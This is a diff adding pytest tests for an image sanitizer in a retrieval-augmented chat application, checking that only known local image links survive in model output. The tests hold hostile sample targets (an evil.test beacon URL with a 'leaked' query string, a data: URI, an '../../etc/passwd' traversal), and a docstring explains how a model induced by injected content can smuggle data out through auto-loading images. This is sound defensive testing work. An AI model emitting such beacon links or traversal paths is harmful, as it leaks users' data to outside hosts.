@@ -1,11 +1,13 @@
 from unittest.mock import MagicMock, patch
 
+import pytest
+
 from langchain_core.documents import Document
 
 from rag import (
     _is_structural_query, _format_chunk, pick_model, rewrite_query, _append_caveat_if_low_context,
     _build_source_citations, _citation_filenames, _sanitize_citations,
-    _find_stream_cut, _sanitize_stream_buffer,
+    _find_stream_cut, _sanitize_stream_buffer, _sanitize_and_filter_images,
 )
 
 
@@ -277,3 +279,47 @@ class TestSanitizeStreamBuffer:
         safe, tail = _sanitize_stream_buffer(text, set(), set())
         assert safe == text
         assert tail == ""
+
+
+# ── Image sanitizer: external-origin exfiltration guard (SEC-2) ────────────────
+
+VALID_IMG_ID = "a" * 32
+
+
+def test_sanitize_keeps_advertised_local_image():
+    md = f"see ![fig](/images/{VALID_IMG_ID}) here"
+    clean, _ = _sanitize_and_filter_images(md, [], {VALID_IMG_ID})
+    assert f"/images/{VALID_IMG_ID}" in clean
+
+
+def test_sanitize_strips_unadvertised_local_image():
+    md = f"see ![fig](/images/{'b' * 32}) here"
+    clean, _ = _sanitize_and_filter_images(md, [], {VALID_IMG_ID})
+    assert "/images/" not in clean
+
+
+@pytest.mark.parametrize(
+    "target",
+    [
+        "https://evil.test/beacon.png?q=leaked",
+        "http://evil.test/p.gif",
+        "//evil.test/p.gif",
+        "data:image/png;base64,iVBORw0KGgo=",
+        "../../etc/passwd",
+        "/imagesX/" + VALID_IMG_ID,
+    ],
+)
+def test_sanitize_strips_non_local_image_targets(target):
+    """An external image target is an auto-loading exfiltration beacon: the browser
+    fetches it with no interaction, leaking viewer IP/UA plus anything the model was
+    induced to smuggle into the query string."""
+    clean, _ = _sanitize_and_filter_images(f"x ![a]({target}) y", [], {VALID_IMG_ID})
+    assert "evil.test" not in clean
+    assert "data:" not in clean
+    assert "etc/passwd" not in clean
+
+
+def test_sanitize_mixed_keeps_only_the_local_one():
+    md = f"![ok](/images/{VALID_IMG_ID}) and ![bad](https://evil.test/x.png)"
+    clean, _ = _sanitize_and_filter_images(md, [], {VALID_IMG_ID})
+    assert f"/images/{VALID_IMG_ID}" in clean and "evil.test" not in clean
